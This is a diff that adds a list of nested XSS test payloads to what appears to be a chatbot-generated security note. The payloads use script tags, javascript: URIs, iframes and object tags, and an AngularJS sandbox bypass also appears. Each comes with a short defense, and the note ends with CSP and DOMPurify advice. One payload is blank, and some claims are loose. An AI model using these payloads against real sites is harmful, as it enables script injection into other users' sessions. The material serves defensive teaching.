@@ -53,3 +53,118 @@ Copy
 Edit
 {{constructor.constructor('alert(1)')()}}
 ✅ Defense: Use ng-bind instead of ng-model, and update to the latest AngularJS version to avoid sandbox bypasses.
+
+
+
+
+
+1. Basic Nested HTML XSS (Simple Injection)
+Payload:
+html
+Copy
+Edit
+<div><script>alert(1)</script></div>
+✅ Defense: Use output encoding and filter <script> tags before rendering.
+
+2. Deeply Nested XSS
+If an application only checks the first level of sanitization, this payload can bypass it.
+
+Payload:
+html
+Copy
+Edit
+<div><div><div><script>alert(1)</script></div></div></div>
+✅ Defense: Ensure deep sanitization using libraries like DOMPurify.
+
+3. SVG-Based Nested XSS
+SVG elements can execute scripts inside <script> tags or event handlers.
+
+Payload:
+html
+Copy
+Edit
+
+✅ Defense: Disallow inline event handlers and restrict <svg> tags in user inputs.
+
+4. Breaking Out of Attributes (Nested Quotes)
+Some web applications fail to properly handle nested attributes, leading to bypasses.
+
+Payload:
+html
+Copy
+Edit
+<a href="javascript:alert(1)" onmouseover="alert(2)">Click Me</a>
+✅ Defense: Restrict JavaScript URIs in links.
+
+5. Table-Based Nested XSS
+Some WYSIWYG editors or CMS platforms allow nested table structures that can be manipulated.
+
+Payload:
+html
+Copy
+Edit
+<table><tr><td><script>alert(1)</script></td></tr></table>
+✅ Defense: Restrict script execution in HTML elements.
+
+6. Comment-Based Bypass
+Some XSS filters ignore JavaScript inside HTML comments.
+
+Payload:
+html
+Copy
+Edit
+<!--<script>alert(1)</script>-->
+✅ Defense: Ensure all HTML comments are sanitized properly.
+
+7. JSON Nested XSS Injection
+If an application renders JSON inside an HTML page:
+
+Payload:
+html
+Copy
+Edit
+{"user": "<div><script>alert(1)</script></div>"}
+✅ Defense: Properly escape JSON before injecting into HTML.
+
+8. iframe-Based XSS Injection
+If an application allows iframes, it can be abused for XSS.
+
+Payload:
+html
+Copy
+Edit
+<iframe src="javascript:alert(1)"></iframe>
+✅ Defense: Use sandbox attribute on iframes and CSP headers.
+
+9. Object Tag-Based XSS
+Older browsers may execute JavaScript inside <object> tags.
+
+Payload:
+html
+Copy
+Edit
+<object data="javascript:alert(1)"></object>
+✅ Defense: Block <object> tags in user input.
+
+Final Defense Strategies:
+Use Proper Content Security Policy (CSP)
+
+http
+Copy
+Edit
+Content-Security-Policy: default-src 'self'; script-src 'self'
+Use Secure Output Encoding
+
+HTML encode user-generated content before displaying it.
+
+Apply Strict Input Validation
+
+Only allow expected HTML tags and attributes.
+
+Sanitize Input with DOMPurify
+
+js
+Copy
+Edit
+let cleanHTML = DOMPurify.sanitize(userInput);
+Would you like help setting up automated XSS detection in your application security pipeline? 🚀
